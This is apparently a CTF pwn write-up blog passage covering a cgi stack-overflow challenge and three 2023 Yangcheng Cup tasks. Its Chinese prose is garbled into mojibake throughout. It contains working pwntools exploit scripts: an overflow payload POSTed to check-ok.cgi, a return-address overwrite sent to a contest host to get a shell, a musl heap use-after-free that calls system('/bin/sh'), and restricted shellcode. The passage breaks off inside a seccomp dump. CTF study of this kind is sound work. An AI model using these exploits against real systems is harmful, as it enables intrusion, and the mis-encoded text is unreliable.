docker-desktopã€‚</p><p>ç›®å½•ä¸‹å‡†å¤‡äº† Dockerfileï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272155494.png" alt="image-20230927215529410" style="zoom:50%;" /><p>æ‰“å¼€è¯¥ç›®å½•ç»ˆç«¯ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œç­‰å¾…é•œåƒæ‹‰å»ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t cgipwn:v1 .</span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272156551.png" alt="image-20230927215650152" style="zoom:33%;" /><p>ç„¶åè¿è¡Œé•œåƒï¼Œéœ€è¦æ˜ å°„ç«¯å£ï¼Œè¿™ä¸ªå¯ä»¥åœ¨ docker-compose.yml ä¸­æ‰¾åˆ°ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272159875.png" alt="image-20230927215900849" style="zoom: 50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272158116.png" alt="image-20230927215824066" style="zoom:50%;" /><p>æ­å»ºå®Œæˆã€‚</p><p>æ¯”èµ›æ—¶ååˆ†æ„éš¾å¹³çš„ä¸€é“é¢˜ã€‚é¢˜ç›®å½•ä¸‹æœ‰ä¸¤ä¸ª .cgi æ–‡ä»¶ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272120407.png" alt="image-20230927212047227" style="zoom:50%;" /><p>æ‰“å¼€ check-ok.cgiï¼Œå‘ç°ä¸€ä¸ªåœ°æ–¹æ˜¯æ ˆæº¢å‡ºï¼Œå¹¶ä¸”è¯¥ç¨‹åºè¿˜ç»™äº†åé—¨ï¼Œæˆ‘å½“åœºå°±æ˜¯çªƒå–œï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272120364.png" alt="image-20230927212021297" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272127924.png" alt="image-20230927212721896" style="zoom:50%;" /><p>ä½†è¦è¿›å…¥æ¼æ´å‡½æ•°å°±éœ€è¦ç”Ÿæˆ ./invitedCODE.txtï¼Œä½†è¦å¦‚ä½•è·å–åˆ° ./invitedCODE.txt å‘¢ï¼Ÿæˆ‘ä»¬æ‰“å¼€ç½‘é¡µçœ‹ä¸€ä¸‹ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272131428.png" alt="image-20230927213144202" style="zoom:50%;" /><p>çŒœæµ‹å°±æ˜¯ä¸‹é¢çš„é‚€è¯·ç ï¼ˆinvitedCODEï¼‰äº†ï¼Œæˆ‘ä»¬ç‚¹è¿›å»ï¼Œå‘ç°æœåŠ¡å™¨è¿”å› 500ï¼Œè®¿é—®çš„æ­£æ˜¯å¦ä¸€ä¸ª getcookie.cgiï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272132101.png" alt="image-20230927213243828" style="zoom:50%;" /><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹ getcookie.cgi çš„ç¨‹åºé€»è¾‘ï¼Œå…¶å®å°±æ˜¯è·å–ç¯å¢ƒå˜é‡ä¸­çš„ HTTP_COOKIEï¼ŒCOOKIE æ­£ç¡®åå°±ä¼šç”Ÿæˆé‚€è¯·ç ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272134644.png" alt="image-20230927213428450" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272134826.png" alt="image-20230927213459631" style="zoom:50%;" /><p>åœ¨æ­¤ä¹‹å‰ï¼Œæœ‰ä¸€äº›éœ€è¦äº†è§£çš„ cgi ç›¸å…³çš„ get_env å‚æ•°ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272137465.png" alt="image-20230927213721399" style="zoom:50%;" /><p>å…¶ä¸­ HTTP_COOKIE å°±æ˜¯æˆ‘ä»¬éœ€è¦æ·»å…¥ COOKIE çš„å†…å®¹ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272136278.png" alt="image-20230927213602220" style="zoom:50%;" /><p>æˆ‘ä»¬åœ¨æœ¬åœ° COOKIE ä¸­åŠ å…¥å®ƒï¼Œå¹¶å†æ¬¡è®¿é—®åï¼Œå‘ç°å¹¶æ²¡æœ‰å†è¿”å› 500 äº†ï¼Œå› æ­¤å¾ˆæœ‰å¯èƒ½ä¹‹å‰ç¨‹åº 500 æ˜¯å› ä¸º getenv(â€œHTTP_COOKIEâ€); æœªæ‰¾åˆ°ç¯å¢ƒå˜é‡å‘ç”Ÿäº†é”™è¯¯ ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272138500.png" alt="image-20230927213835245" style="zoom:50%;" /><p>ä½†æˆ‘ä»¬è¿˜éœ€è¿›ä¸€æ­¥æ„é€  Cookie æ‰èƒ½ç”Ÿæˆé‚€è¯·ç ï¼Œè¿™é‡Œé€†å‘äº†ä¸€ä¼šï¼Œæ‹¿åˆ°äº†é‚€è¯·ç ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272146829.png" alt="image-20230927214615741" style="zoom:50%;" /><p>æ˜¯çš„ï¼Œåˆ°è¿™é‡Œæˆ‘ä»¥ä¸ºå·²ç»ååˆ†è½»æ¾äº†ï¼Œæˆ‘ç«‹é©¬å°±æ˜¯è¿›å…¥ check-ok.cgiï¼Œæƒ³ç€è¿™ä¸‹æ€»ç®—å¯ä»¥æº¢å‡ºäº†å§ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272148160.png" alt="image-20230927214851061" style="zoom:50%;" /><p>æ³¨æ„è¯·æ±‚ check-ok.cgi æ˜¯ post æ–¹æ³•ï¼Œè‡ªå¸¦ cmd=ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272241524.png" alt="image-20230927224117444" style="zoom:50%;" /><p>å› æ­¤è®¡ç®—ä¸€ä¸‹åç§»ä¸º 228ï¼Œç„¶åè„šæœ¬ï¼Œå¯åŠ¨ï¼</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272239873.png" alt="image-20230927223940778" style="zoom:50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd=aaaaaaaaaaaa.......</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;cmd&#x27;</span>: <span class="string">b&#x27;a&#x27;</span>*<span class="number">228</span> + p64(<span class="number">0x4032E0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#å› ä¸ºæ˜¯dockerå†…çš„è„šæœ¬ï¼Œè¦è®¿é—®åˆ°ä¸»æœºå¯ä»¥é€šè¿‡host.docker.internal</span></span><br><span class="line">r = requests.post(<span class="string">&quot;http://host.docker.internal:12000/check-ok.cgi&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯ç¨‹åºå´©äº†ï¼Œä¸”ç›®å½•ä¸‹ä¹Ÿæ²¡ç”Ÿæˆ flagï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309272251067.png" alt="image-20230927225140018" style="zoom:50%;" /><p>ä¸€äº›èµ›ä¸­+èµ›åçš„æ€è€ƒï¼š</p><p>èµ·åˆæˆ‘è®¤ä¸ºæ˜¯ç¼–ç çš„é—®é¢˜ï¼Œå› ä¸ºå½“æˆ‘è¾“å…¥ %20ï¼ˆ+ï¼‰ æ—¶ï¼Œæ˜¯å¯ä»¥å½“ä½œä¸€ä¸ªå­—ç¬¦è¯»å…¥çš„ï¼Œè€Œè¾“å…¥ %E0 åˆ™è¢«å½“æˆä¸‰ä¸ªå­—ç¬¦æ¥è¾“å…¥ï¼Œè¿™è®©æˆ‘å¾ˆå›°æƒ‘ï¼Œå› ä¸º 0x4032E0 ä¸­ \xe0 æ˜¯ä¸å¯è§çš„ï¼Œä¸çŸ¥é“è¯¥å¦‚ä½•è¢«è§£ç æˆä¸€ä¸ªå­—ç¬¦è¯»å…¥ï¼Œè€Œ 0x40 å’Œ 0x32 æ˜¯å¯ä»¥ç”¨å¯è§å­—ç¬¦è¡¨ç¤ºçš„ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309281859838.png" alt="image-20230928185958661" style="zoom:50%;" /><p>ä½†è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°½ç®¡ fgets ä¼šç»™æœ«å°¾æ·»ä¸Š \x00ï¼Œä½† main çš„è¿”å›åœ°å€æ˜¯ libc ä¸Šçš„ 6 ä¸ªå­—èŠ‚ï¼Œåªè¦†ç›– 3+1 ä¸ªå­—èŠ‚æ— æ³•ä½¿é«˜ä½å˜æˆ \x00ï¼Œæœ¬è´¨ä¸Šä¹Ÿæ˜¯ä¸å¯è§å­—ç¬¦é—®é¢˜ã€‚</p><p>äºæ˜¯å¼€å§‹ç¿»åšå®¢ï¼Œå‘ç°ä¸å¯è§å­—ç¬¦åœ¨ URL ç¼–ç ä¸­æ˜¯éæ³•çš„ğŸ˜©ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309281847179.png" alt="image-20230928184744925" style="zoom: 33%;" /><p>å¤´è„‘é£æš´ä¸€ä¸‹ï¼Œæœ‰æ²¡æœ‰å¯èƒ½æ˜¯ Apache ä¸­é—´ä»¶æ¼æ´ï¼Ÿæˆ–è®¸å¯ä»¥ç›®å½•ç©¿è¶Šè¯» flagï¼Œæ¯•ç«Ÿæ ¹æ®é”™è¯¯é¡µé¢å¯çŸ¥ Apache ç‰ˆæœ¬å¹¶ä¸æ˜¯æœ€æ–°ç‰ˆçš„ï¼ŒæŸ¥äº†ä¸€ä¸‹ CVEï¼Œä½†ä¸çŸ¥é“æ˜¯ä¸æ˜¯æ”»å‡»æ–¹å¼ä¸å¯¹ï¼Œæ— æœã€‚ </p><p>ç­‰è§£ç­”ğŸ˜­ã€‚</p><h1 id="2023ç¾ŠåŸæ¯åˆèµ›"><a href="#2023ç¾ŠåŸæ¯åˆèµ›" class="headerlink" title="2023ç¾ŠåŸæ¯åˆèµ›"></a>2023ç¾ŠåŸæ¯åˆèµ›</h1><p>å‚è€ƒ wpï¼š<a href="http://blog.xmcve.com/2023/09/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2023-Writeup/#title-30">æ˜Ÿç›Ÿ</a></p><h2 id="1-risky-login"><a href="#1-risky-login" class="headerlink" title="1. risky_login"></a>1. risky_login</h2><p>risc-v æ¶æ„ç¨‹åºä¸‹çš„æ ˆæº¢å‡ºï¼Œida ä¸‹æ— æ³•è¿›è¡Œåç¼–è¯‘ï¼Œéœ€è¦ç”¨åˆ° <strong>ghidra</strong>ã€‚ç¨‹åºå°±ä¸€ä¸ªç®€å•çš„æ ˆæº¢å‡ºå’Œæ•´æ•°æº¢å‡ºï¼Œè¦†ç›–è¿”å›åœ°å€ä¸ºåé—¨å‡½æ•°å³å¯ã€‚</p><p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309042023909.png" alt="image-20230904202324815"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;tcp.cloud.dasctf.com&quot;</span>, <span class="number">24273</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x12345770</span></span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&quot;Input ur name:\n&quot;</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">256</span> + p64(backdoor)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Input ur words&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-cookieBox"><a href="#2-cookieBox" class="headerlink" title="2. cookieBox"></a>2. cookieBox</h2><p>musl libc pwnï¼Œç‰ˆæœ¬æ˜¯ v1.1.24ï¼Œå­˜åœ¨ UAF æ¼æ´ã€‚</p><p>éœ€è¦ patchelf ä¸ºç›®æ ‡ libc.so æ‰èƒ½åœ¨æœ‰ musl ç¯å¢ƒçš„ ubuntu ä¸Šè¿è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf ./cookieBox --set-interpreter ./libc.so cookieBox</span><br></pre></td></tr></table></figure><p>é€šè¿‡å †åˆå§‹åŒ–æ³„éœ² Libcï¼Œé€šè¿‡ UAFï¼Œæ‰“ unbin åŠ«æŒå…¨å±€å˜é‡åŒºåŸŸä¸Šçš„å †æŒ‡é’ˆä¸º __io_FILEï¼Œé€šè¿‡ puts å³å¯è§¦å‘é“¾å­ã€‚æ›´è¯¦ç»†çš„ç»†èŠ‚å¯ä»¥å‚è€ƒå¦ä¸€ç¯‡åšå®¢<code>musl pwn</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./cookieBox&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the size:\n&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the Content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the idx:\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the idx:\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;Please input the content:\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt;&quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Please input the idx:\n&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)   <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x292e50</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">stdout = libc_base + libc.sym[<span class="string">&quot;__stdout_FILE&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">mal = libc_base + <span class="number">0x292ac0</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#4(1)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, p64(stdout) + p64(<span class="number">0x602060</span>))</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">64</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-shellcode"><a href="#3-shellcode" class="headerlink" title="3. shellcode"></a>3. shellcode</h2><p>ååˆ†æœ‰è¶£çš„ä¸€é“ shellcode é¢˜ç›®ï¼Œè·Ÿç€ wp è°ƒè¯•çš„æ—¶å€™æ„Ÿè§‰è‡ªå·±æƒ³è±¡åŠ›è¿˜æ˜¯å¤ªåŒ®ä¹äº†ğŸ˜µã€‚</p><p>åˆšå¼€å§‹æœ‰ä¸ªè¾“å…¥ 2 å­—èŠ‚çš„è¾“å…¥ï¼Œä¸€å¼€å§‹ä¸çŸ¥é“æ€ä¹ˆåˆ©ç”¨ï¼Œçœ‹äº† wp æ‰çŸ¥é“ syscall ä¹Ÿæ˜¯äºŒå­—èŠ‚<code>\x0f\x05</code>ï¼Œåé¢ call çš„æ—¶å€™éœ€è¦è¿”å›åˆ°è¿™ä¸ªä¸Šé¢ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309042208620.png" alt="image-20230904220843487" style="zoom: 50%;" /><p>è¿›å…¥å…³é”®ç¨‹åºï¼Œè¯»å…¥ä¸€ä¸²é•¿åº¦ä¸º 17 çš„ shellcode å call è°ƒç”¨ï¼Œåªå…è®¸ä½¿ç”¨<code>OPQRSTUVWXYZ[\]^_</code> ï¼Œä¸”å¼€å¯äº†æ²™ç®±ï¼Œåªå…è®¸ orwã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309042215362.png" alt="image-20230904221523314" style="zoom:50%;" /><p>é™¤äº† O ä»¥å¤–å¯ä»¥è‡ªå•ç¼–ç ï¼ˆå³ä¸€ä¸ªå­—ç¬¦å³å¯ç»„æˆä¸€å¥æŒ‡ä»¤ï¼‰ï¼š</p><table><thead><tr><th align="center">ASCIIå­—ç¬¦</th><th align="center">HEX</th><th align="center">æ±‡ç¼–æŒ‡ä»¤</th></tr></thead><tbody><tr><td align="center">P</td><td align="center">0x50</td><td align="center">push rax</td></tr><tr><td align="center">Q</td><td align="center">0x51</td><td align="center">push rcx</td></tr><tr><td align="center">R</td><td align="center">0x52</td><td align="center">push rdx</td></tr><tr><td align="center">S</td><td align="center">0x53</td><td align="center">push rbx</td></tr><tr><td align="center">T</td><td align="center">0x54</td><td align="center">push rsp</td></tr><tr><td align="center">U</td><td align="center">0x55</td><td align="center">push rbp</td></tr><tr><td align="center">V</td><td align="center">0x56</td><td align="center">push rsi</td></tr><tr><td align="center">W</td><td align="center">0x57</td><td align="center">push rdi</td></tr><tr><td align="center">X</td><td align="center">0x58</td><td align="center">pop rax</td></tr><tr><td align="center">Y</td><td align="center">0x59</td><td align="center">pop rcx</td></tr><tr><td align="center">Z</td><td align="center">0x5a</td><td align="center">pop rdx</td></tr><tr><td align="center">_</td><td align="center">0x5b</td><td align="center">pop rdi</td></tr><tr><td align="center">^</td><td align="center">0x5c</td><td align="center">pop rsi</td></tr><tr><td align="center">\</td><td align="center">0x5d</td><td align="center">pop rsp</td></tr><tr><td align="center">[</td><td align="center">0x5e</td><td align="center">pop rbx</td></tr></tbody></table><p>åœ¨ç¨‹åºæ‰§è¡Œ call shellcode çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦è§‚å¯Ÿä¸€ä¸‹å¯„å­˜å™¨ä»¥åŠæ ˆçš„ç¯å¢ƒï¼Œæ¥çœ‹çœ‹æœ‰å“ªäº›å¯ä»¥åˆ©ç”¨ï¼š</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309042233884.png" alt="image-20230904223352829" style="zoom:50%;" /><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹ wp ç»™çš„ shellcodeï¼Œå„ä¸ªæŒ‡ä»¤åŠŸèƒ½å¦‚æ³¨é‡Šæ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">shellcode1 = asm(</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rsi# ç»™ RSI èµ‹ RAX ï¼Œå…¶å®ä¹Ÿæ˜¯ RIP</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax# ç»™ RAX èµ‹ RBX = 0</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rdi# ç»™ RDI èµ‹ RBX = 0</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">pop rsp# æŠ¬é«˜ RSP åˆ° SHELLCODE é™„è¿‘</span></span><br><span class="line"><span class="string">pop rbp# ç»™ RBP èµ‹ 0x50f</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp</span></span><br><span class="line"><span class="string">push rbp# å‹ä½æ ˆåœ¨ shellcode çš„ç»“å°¾ï¼Œä½¿å¾—æ‰§è¡Œå®Œ shellcode å¯ä»¥ç›´æ¥æ‰§è¡Œ 0x50fï¼ˆsyscallï¼‰</span></span><br><span class="line"><span class="string">pop rdx# ç»™ RDX èµ‹ RBP = 0x50f</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>).ljust(<span class="number">17</span>, <span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, RIP, 0x50f)</span></span><br></pre></td></tr></table></figure><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309042303386.png" alt="image-20230904230350331" style="zoom:50%;" /><p>ç”±æ­¤æˆ‘ä»¬å¯ä»¥åœ¨æ ˆä¸Šå†™å…¥ orw çš„ shellcodeï¼Œä½†æˆ‘ä»¬éœ€è¦è§‚å¯Ÿä¸€ä¸‹é¢˜ç›®çš„æ²™ç®±ï¼Œå¯ä»¥å‘ç°ï¼š</p><ol><li>è°ƒç”¨ read å‡½æ•°æ—¶å…¶ fd å¿…é¡»å°äºç­‰äº 2 ï¼Œä¸ç„¶ç›´æ¥ killï¼Œä½† open ä¸€ä¸ªæ–‡ä»¶ä¸€èˆ¬è¿”å›çš„ fd éƒ½æ˜¯ &gt;= 3ã€‚</li><li>è°ƒç”¨ write å‡½æ•°æ—¶å…¶ fd å¿…é¡»å¤§äº 2ï¼Œä¸ç„¶ç›´æ¥ killã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x12</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0f</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x0d</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0019</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x0c</span> <span class="number">0x00</span> <span class="number">0x00000021</span>  <span class="keyword">if</span> (A == dup2) <span class="keyword">goto</span> <span class="number">0019</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != read) <span class="keyword">goto</span> <span class="number">0013</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  A = fd &gt;&gt; <span class="number">32</span> <span class="meta"># read(fd, buf, count)</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x25</span> <span class="number">0x0a</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A &gt; <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A != <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0019</span></span><br><span 